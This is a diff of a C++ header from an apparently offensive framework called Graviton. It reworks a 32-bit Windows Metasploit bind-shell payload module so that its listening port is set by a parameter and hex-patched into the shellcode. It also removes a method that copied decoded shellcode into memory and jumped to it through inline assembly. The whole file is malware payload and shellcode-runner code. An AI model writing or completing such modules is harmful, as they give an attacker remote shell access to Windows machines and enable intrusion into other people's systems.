@@ -19,20 +19,24 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief Payload_Meter_W32b
+ * @brief Windows_MSF_Shell_Bind_32
  *
 */
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#ifndef _GVN_PAYLOAD_METER_W32B_HEAD_
-#define _GVN_PAYLOAD_METER_W32B_HEAD_
+#ifndef _GVN_Windows_MSF_Shell_Bind_32_HEAD_
+#define _GVN_Windows_MSF_Shell_Bind_32_HEAD_
 
-#include "../gvn_payload.hpp"
-
+#include <payload/payload.hpp>
+#include <utils/optparser.hpp>
 #include <cstdio>
 #include <cstdlib>
 
-using namespace GraVitoN;
+namespace GraVitoN
+{
+
+namespace Payload
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
@@ -41,34 +45,36 @@ using namespace GraVitoN;
  * @see Payload_Sample
  *
  */
-class Payload_Meter_W32b : public GraVitoN::Bin_Payload
+class Windows_MSF_Shell_Bind_32 : public Payload::Binary_Payload
 {
+private:
+    unsigned int port;
+
 protected:
 	virtual bool initPayload();
 	bool decode();
 	
 public:
-    Payload_Meter_W32b();
-    virtual ~Payload_Meter_W32b();
+    Windows_MSF_Shell_Bind_32();
+    virtual ~Windows_MSF_Shell_Bind_32();
 
-    virtual bool initialize ( const string &_options );
-    virtual bool run();
+    virtual bool initialize ( const unsigned int &bport );
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Meter_W32b::Payload_Meter_W32b()
+Windows_MSF_Shell_Bind_32::Windows_MSF_Shell_Bind_32()
 {
     jumper = _null_;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Meter_W32b::~Payload_Meter_W32b()
+Windows_MSF_Shell_Bind_32::~Windows_MSF_Shell_Bind_32()
 {
 }
 
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b::decode()
+bool Windows_MSF_Shell_Bind_32::decode()
 {
 	//Logger::logItLn(payload);
 	
@@ -101,9 +107,9 @@ bool Payload_Meter_W32b::decode()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b::initPayload()
+bool Windows_MSF_Shell_Bind_32::initPayload()
 {
-	string hex_port = "1cbd"; // port=7357
+    string hex_port = Utils::OptParser::toHex(port);
 	
     /**
      * windows/meterpreter/bind_tcp - 298 bytes (stage 1) \n
@@ -137,9 +143,6 @@ bool Payload_Meter_W32b::initPayload()
 		
     int buf_len = 298*2;
 	
-	if( !OptParser::getValueAsHexString(options, "PORT", hex_port) )
-		hex_port = "1cbd"; // 7357
-	
 	int pos = 13*30 + 10;
 	while( hex_port.length() < 4 )
 		hex_port = "0" + hex_port;
@@ -155,48 +158,23 @@ bool Payload_Meter_W32b::initPayload()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b::initialize ( const string &_options )
+bool Windows_MSF_Shell_Bind_32::initialize ( const unsigned int &bport )
 {
-    options = _options;
+    port = bport;
 
 	/// Init memory
-    Logger::logIt ( "init payload... " );
+    Core::Logger::logIt ( "init payload... " );
     initPayload();
-    Logger::logItLn ( "done" );
+    Core::Logger::logItLn ( "done" );
 
 	/// Decode
-	Logger::logIt ( "decoding..." );
+    Core::Logger::logIt ( "decoding..." );
     decode();
-    Logger::logItLn ( "done" );
-
-	/// Set jumper address
-    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    Core::Logger::logItLn ( "done" );
 
     return true;
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b::run()
-{
-    // A Little Delay!
-    int _delay = 222;
-    while ( _delay > 0 ) {
-        --_delay;
-    }
-
-    int useless_out = 0;
-    Logger::logItLn ( "Jumping..." );
-    asm (
-        "mov %1, %%ebx;"
-        "jmp *%%ebx;"
-        : "=r" ( useless_out )
-        : "r" ( jumper )
-        : "%ebx"
-    );
-    Logger::logItLn ( "call > done" );
-
-    return true;
 }
-
-#endif // _GVN_PAYLOAD_METER_W32B_HEAD_
+}
+#endif // _GVN_Windows_MSF_Shell_Bind_32_HEAD_
